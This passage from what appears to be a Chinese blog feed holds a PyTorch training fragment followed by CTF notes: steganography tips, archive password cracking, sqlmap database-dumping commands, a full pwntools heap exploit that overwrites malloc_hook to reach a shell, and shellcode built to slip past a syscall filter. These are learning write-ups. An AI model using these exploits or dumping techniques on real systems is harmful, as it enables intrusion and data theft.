function_">load_data_fashion_mnist</span>(<span class="hljs-params">batch_size, resize=<span class="hljs-literal">None</span></span>): <br>    trans = [transforms.ToTensor()]<br>    <span class="hljs-keyword">if</span> resize:<br>        trans.insert(<span class="hljs-number">0</span>, transforms.Resize(resize))<br>    trans = transforms.Compose(trans)<br>    mnist_train = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">True</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    mnist_test = torchvision.datasets.FashionMNIST(<br>        root=<span class="hljs-string">&quot;./data&quot;</span>, train=<span class="hljs-literal">False</span>, transform=trans, download=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">return</span> (<br>            data.DataLoader(mnist_train, batch_size, shuffle=<span class="hljs-literal">True</span>, num_workers=get_dataloader_workers()),<br>            data.DataLoader(mnist_test, batch_size, shuffle=<span class="hljs-literal">False</span>, num_workers=get_dataloader_workers())<br>           )<br>train_iter, test_iter = load_data_fashion_mnist(batch_size)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 不重要，不用看</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Accumulator</span>:  <br>    <span class="hljs-string">&quot;&quot;&quot;在n个变量上累加&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, n</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * n<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">self, *args</span>):<br>        self.data = [a + <span class="hljs-built_in">float</span>(b) <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(self.data, args)]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">reset</span>(<span class="hljs-params">self</span>):<br>        self.data = [<span class="hljs-number">0.0</span>] * <span class="hljs-built_in">len</span>(self.data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params">self, idx</span>):<br>        <span class="hljs-keyword">return</span> self.data[idx]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">accuracy</span>(<span class="hljs-params">y_hat, y</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;计算预测正确的数量&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(y_hat.shape) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> y_hat.shape[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span>:<br>        y_hat = y_hat.argmax(axis=<span class="hljs-number">1</span>)<br>    cmp = y_hat.<span class="hljs-built_in">type</span>(y.dtype) == y<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">float</span>(cmp.<span class="hljs-built_in">type</span>(y.dtype).<span class="hljs-built_in">sum</span>())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate_accuracy</span>(<span class="hljs-params">net, data_iter</span>):  <br>    <span class="hljs-string">&quot;&quot;&quot;计算在指定数据集上模型的精度&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># 将模型设置为评估模式</span><br>    metric = Accumulator(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 正确预测数、预测总数</span><br>    <span class="hljs-keyword">with</span> torch.no_grad():<br>        <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> data_iter:<br>            metric.add(accuracy(net(X), y), y.numel())<br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_epoch_ch3</span>(<span class="hljs-params">net, train_iter, loss, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;训练模型一个迭代周期（定义见第3章）&quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 将模型设置为训练模式</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(net, torch.nn.Module):<br>        net.train()<br>    <span class="hljs-comment"># 训练损失总和、训练准确度总和、样本数</span><br>    metric = Accumulator(<span class="hljs-number">3</span>)<br>    <span class="hljs-keyword">for</span> X, y <span class="hljs-keyword">in</span> train_iter:<br>        <span class="hljs-comment"># 计算梯度并更新参数</span><br>        y_hat = net(X)<br>        l = loss(y_hat, y)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(updater, torch.optim.Optimizer):  <span class="hljs-comment"># 这次就是true了</span><br>            <span class="hljs-comment"># 使用PyTorch内置的优化器和损失函数</span><br>            updater.zero_grad()<br>            l.mean().backward()<br>            updater.step()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 使用定制的优化器和损失函数</span><br>            l.<span class="hljs-built_in">sum</span>().backward()<br>            updater(X.shape[<span class="hljs-number">0</span>])<br>        metric.add(<span class="hljs-built_in">float</span>(l.<span class="hljs-built_in">sum</span>()), accuracy(y_hat, y), y.numel())<br>    <span class="hljs-comment"># 返回训练损失和训练精度</span><br>    <span class="hljs-keyword">return</span> metric[<span class="hljs-number">0</span>] / metric[<span class="hljs-number">2</span>], metric[<span class="hljs-number">1</span>] / metric[<span class="hljs-number">2</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train_ch3</span>(<span class="hljs-params">net, train_iter, test_iter, loss, num_epochs, updater</span>):  <span class="hljs-comment">#@save</span><br>    <span class="hljs-string">&quot;&quot;&quot;训练模型（定义见第3章）&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):<br>        train_metrics = train_epoch_ch3(net, train_iter, loss, updater)<br>        train_loss, train_acc = train_metrics<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;epoch <span class="hljs-subst">&#123;epoch + <span class="hljs-number">1</span>&#125;</span>, loss <span class="hljs-subst">&#123;train_loss:f&#125;</span>, acc <span class="hljs-subst">&#123;train_acc:f&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">train_ch3(net, train_iter, test_iter, loss, num_epochs, trainer)<br></code></pre></td></tr></table></figure><pre><code class="hljs">epoch 1, loss 0.869232, acc 0.711650epoch 2, loss 0.558885, acc 0.805100epoch 3, loss 0.494192, acc 0.828150epoch 4, loss 0.463008, acc 0.837517epoch 5, loss 0.441443, acc 0.844883epoch 6, loss 0.417930, acc 0.853567epoch 7, loss 0.403445, acc 0.858967epoch 8, loss 0.394371, acc 0.860567epoch 9, loss 0.382370, acc 0.865217epoch 10, loss 0.372356, acc 0.867917</code></pre>]]></content>
    
    
    <categories>
      
      <category>pytorch</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pytorch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pcap隐写</title>
    <link href="/2023/11/17/ctf-misc/pcap/"/>
    <url>/2023/11/17/ctf-misc/pcap/</url>
    
    <content type="html"><![CDATA[<h3 id="TCP流追踪"><a href="#TCP流追踪" class="headerlink" title="TCP流追踪"></a>TCP流追踪</h3><p>tcp包可以携带data</p><p>在wireshark -&gt; 分析 -&gt; 追踪流 -&gt; TCP流可以查看所有tcp的data字段拼接到一起的值</p>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>png隐写</title>
    <link href="/2023/11/17/ctf-misc/png%E9%9A%90%E5%86%99/"/>
    <url>/2023/11/17/ctf-misc/png%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<p><a href="https://buuoj.cn/challenges#%E5%A4%A7%E7%99%BD">https://buuoj.cn/challenges#%E5%A4%A7%E7%99%BD</a></p><p><img src="/img/pngmisc/1.jpg"></p><p>010 editor 第二行前两个字段是图片的宽和高</p>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>压缩包misc</title>
    <link href="/2023/11/17/ctf-misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%A0%B4%E8%A7%A3/"/>
    <url>/2023/11/17/ctf-misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h3 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h3><p><img src="/img/fcrackzip/1.jpg"></p><p>-b 暴力破解</p><p>-c 指定字符集 1 代表数字</p><p>-l 长度区间</p><p>-u 不显示错误密码</p><h3 id="RAR"><a href="#RAR" class="headerlink" title="RAR"></a>RAR</h3><p>rarcrack：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rarcrack ./基础破解.rar --type rar --threads 100<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rarcrack</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">abc</span>&gt;</span>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<span class="hljs-tag">&lt;/<span class="hljs-name">abc</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">current</span>&gt;</span>023q<span class="hljs-tag">&lt;/<span class="hljs-name">current</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">good_password</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rarcrack</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以在xml里改current改变破解位置</p><p>但是破解起来巨慢。。。因为不能选择密码字符类型</p><p>从吾爱破解下载的ARCHPR：</p><p><img src="/img/fcrackzip/2.jpg"></p><h3 id="ZIP伪加密"><a href="#ZIP伪加密" class="headerlink" title="ZIP伪加密"></a>ZIP伪加密</h3><p><img src="/img/fcrackzip/3.jpg"></p><p>这两个字节改为00 00。虽然这只改了压缩文件数据区，但还是能够解压出来（7zip会报个头部错误）</p><p>理论上还应该改压缩文件目录区的是否加密的标志</p>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2023/11/15/ctf-web/sqlmap/"/>
    <url>/2023/11/15/ctf-web/sqlmap/</url>
    
    <content type="html"><![CDATA[<p>判断能否注入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1<br></code></pre></td></tr></table></figure><p>查看数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1 --dbs<br></code></pre></td></tr></table></figure><p>查看指定数据库的表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1 --dbs -D &lt;dbname&gt; -tables<br></code></pre></td></tr></table></figure><p>查看指定表的列</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1 --dbs -D &lt;dbname&gt; -T &lt;tablename&gt; -columns<br></code></pre></td></tr></table></figure><p>查看列内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1 --dbs -D &lt;dbname&gt; -T &lt;tablename&gt; -C &lt;colname&gt; -dump<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>realloc hook</title>
    <link href="/2023/11/14/ctf-pwn/reallochook/"/>
    <url>/2023/11/14/ctf-pwn/reallochook/</url>
    
    <content type="html"><![CDATA[<p>one gadget 条件不满足，需要调整栈，让<code>rsp+xxx</code>等于null。</p><p>原理：</p><p>realloc的汇编代码，在调用realloc_hook之前比malloc、free等多了push指令和sub抬栈操作</p><p>realloc_hook同malloc_hook相邻，一次性修改两个，还可以用<code>malloc-0x23</code></p><p>操作：</p><ol><li><p>修改malloc_hook为realloc控制栈帧的地址</p></li><li><p>修改realloc_hook为onegadget</p></li></ol><h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><p><a href="https://buuoj.cn/challenges#roarctf_2019_easy_pwn">https://buuoj.cn/challenges#roarctf_2019_easy_pwn</a></p><p>不知道libc。buuoj只说了是ubuntu16，buuoj上下下来的libc-2.23.so和我抄的题解的不一样（one gadget就不一致），然后realloc偏移咋来的我就不知道了。。。mallochook的倒是对的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;./roar&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;, 25453)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">index, size, content</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendlineafter(<span class="hljs-string">&quot;content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#1</span><br>create(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#2</span><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#3</span><br>write(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\xb1&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">2</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br>leak = u64(p.recvline()[:<span class="hljs-number">8</span>])<br><br>libc1 = leak - libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x68</span><br>malloc_hook = libc1 + libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libc1 + libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br><br>log.info(<span class="hljs-string">&quot;Leak is:        &quot;</span> + <span class="hljs-built_in">hex</span>(leak))<br>log.info(<span class="hljs-string">&quot;Free hook is:   &quot;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>log.info(<span class="hljs-string">&quot;Malloc hook is: &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>log.info(<span class="hljs-string">&quot;Fake chunk is:  &quot;</span> + <span class="hljs-built_in">hex</span>(fake_chunk))<br>log.info(<span class="hljs-string">&quot;libc is:        &quot;</span> + <span class="hljs-built_in">hex</span>(libc1))<br><br><br>realloc=libc1 + <span class="hljs-number">0x846CD</span><br>log.info(<span class="hljs-string">&quot;realloc is      &quot;</span> + <span class="hljs-built_in">hex</span>(realloc))<br><br>one_gadget=libc1 +<span class="hljs-number">0xf02a4</span><br><br><br>create(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#4</span><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#5</span><br>create(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#6</span><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#7</span><br>write(<span class="hljs-number">3</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x91&#x27;</span>)<br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">5</span>)<br>create(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#5</span><br>write(<span class="hljs-number">5</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>create(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#6</span><br>create(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#8</span><br>write(<span class="hljs-number">8</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb</span>+p64(one_gadget)+p64(realloc))<br><br>create(<span class="hljs-number">0x18</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shellcode trick</title>
    <link href="/2023/11/07/ctf-pwn/shellcode/"/>
    <url>/2023/11/07/ctf-pwn/shellcode/</url>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//检查不许出现syscall的字节： </span><br><span class="hljs-keyword">if</span> ( *v11 == <span class="hljs-number">0x80CD</span> || *v11 == <span class="hljs-number">0x340F</span> || *v11 == <span class="hljs-number">0x50F</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed filter at byte %d!\n&quot;</span>, l);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>把push <span class="hljs-number">0x50f</span>改成 push <span class="hljs-number">0x50e</span> ; inc qword ptr [rsp] <br>shellcode =  \<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;,&#x27;-p&#x27;], envp=0) */</span><br>    <span class="hljs-comment">/* push b&#x27;/bin///sh\x00&#x27; */</span><br>    push <span class="hljs-number">0x68</span><br>    mov rax, <span class="hljs-number">0x732f2f2f6e69622f</span><br>    push rax<br>    mov rdi, rsp<br>    <span class="hljs-comment">/* push argument array [&#x27;sh\x00&#x27;, &#x27;-p\x00&#x27;] */</span><br>    <span class="hljs-comment">/* push b&#x27;sh\x00-p\x00&#x27; */</span><br>    mov rax, <span class="hljs-number">0x101010101010101</span><br>    push rax<br>    mov rax, <span class="hljs-number">0x101010101010101</span> ^ <span class="hljs-number">0x702d006873</span><br>    xor [rsp], rax<br>    xor esi, esi <span class="hljs-comment">/* 0 */</span><br>    push rsi <span class="hljs-comment">/* null terminate */</span><br>    push <span class="hljs-number">0xb</span><br>    pop rsi<br>    add rsi, rsp<br>    push rsi <span class="hljs-comment">/* &#x27;-p\x00&#x27; */</span><br>    push <span class="hljs-number">0x10</span><br>    pop rsi<br>    add rsi, rsp<br>    push rsi <span class="hljs-comment">/* &#x27;sh\x00&#x27; */</span><br>    mov rsi, rsp<br>    xor edx, edx <span class="hljs-comment">/* 0 */</span><br>    <span class="hljs-comment">/* call execve() */</span><br>    push <span class="hljs-number">0x3b</span> <span class="hljs-comment">/* 0x3b */</span><br>    pop rax<br>    <span class="hljs-comment">//syscall</span><br>    push <span class="hljs-number">0x050e</span><br>    inc qword ptr [rsp]<br>    jmp rsp<br>    nop<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>malloc hook</title>
    <link href="/2023/11/04/ctf-pwn/mallochook/"/>
    <url>/2023/11/04/ctf-pwn/mallochook/</url>
    
    <content type="html"><![CDATA[<h3 id="关于什么时候是0x58，什么时候是0x60"><a href="#关于什么时候是0x58，什么时候是0x60" class="headerlink" title="关于什么时候是0x58，什么时候是0x60"></a>关于什么时候是0x58，什么时候是0x60</h3><p>是因为tcache的问题，之前一直都不知道（</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x60</span> <span class="hljs-comment"># tcache</span><br>main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x58</span> <span class="hljs-comment"># no tcache</span><br>main_arena = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - offset <span class="hljs-comment"># other condition(not unsorted bin leak)</span><br>malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br></code></pre></td></tr></table></figure><h3 id="malloc-hook-0x23"><a href="#malloc-hook-0x23" class="headerlink" title="malloc hook - 0x23"></a>malloc hook - 0x23</h3><p>在malloc hook - 0x23分配fakechunk可以达成size=0x70的检查，因为这个地址上size这里是0x7f，而检查机制不会检查标志位</p><blockquote><p>libc2.31版本中这个位置上的数据已经不再是0x7f</p></blockquote><h3 id="0ctfbabyheap"><a href="#0ctfbabyheap" class="headerlink" title="0ctfbabyheap"></a>0ctfbabyheap</h3><p>首先查看保护，发现全开</p><p><img src="/img/0ctfbabyheap/media/2e4d9896a3691192ef608f635d67cde1.png"></p><p>然后题目里告诉了是2.23版本的libc，先用patchelf换一下libc的位置。</p><p><img src="/img/0ctfbabyheap/media/f4d73666de533ddaed7caef8222b2ccf.png"></p><p>然后打开ida查看漏洞点</p><p>发现问题出在fill函数里，大小是用户输入的，可以溢出</p><p><img src="/img/0ctfbabyheap/media/e17462f8199dc6d45437fb7e604f6c4b.png"></p><p>溢出的结果是可以控制下一个chunk的prevsz和inuse bit，将下一个chunk free之后可以合并前面的free chunk。如果被合并的部分里有可以uaf的部分，就可以泄露unsorted bin的头节点mainarena+88的地址，然后泄露libc基地址。</p><p>然后由于可以修改块的大小，可以通过把chunk从unsorted bin里切分拿出来，造成chunk overlapping，然后就可以绕过题目自带的检查，实施fastbin attack的double free（通过free两个序号不同，但是实际地址相同的chunk），结果就是可以实现伪造chunk中的任意地址写，然后就可以把前面泄露的libc中的one_gadget覆盖到malloc hook地址上，然后下一次malloc的时候就会调用execve(…binsh…)。</p><p>具体调试过程如下：</p><p>首先malloc几个chunk进去，然后free掉前两个</p><p><img 